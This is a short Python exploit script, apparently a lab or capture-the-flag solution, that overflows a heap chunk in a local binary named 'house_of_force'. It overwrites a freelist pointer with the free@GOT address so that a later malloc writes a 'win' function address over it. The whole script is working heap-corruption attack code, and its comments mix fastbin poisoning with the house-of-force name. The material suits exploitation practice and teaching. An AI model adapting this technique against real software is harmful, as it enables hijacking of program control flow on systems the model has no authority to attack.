from struct import pack
import subprocess

# Addresses (adjust if needed)
free_got = 0x804c008
win_addr = 0x80491b6

# Craft overflow payload:
# 24 bytes to fill ptr1 chunk, then overwrite freelist fd pointer with free@GOT
payload = b"A" * 24 + pack("<I", free_got)

# Malloc size argument for ptr2 (fastbin size, must match 20)
malloc_size = "20"

# Data to write into ptr2 (which will be at free@GOT after malloc)
win_addr_packed = pack("<I", win_addr)

# Run the vulnerable program with arguments
subprocess.run(["./house_of_force", payload, malloc_size, win_addr_packed])
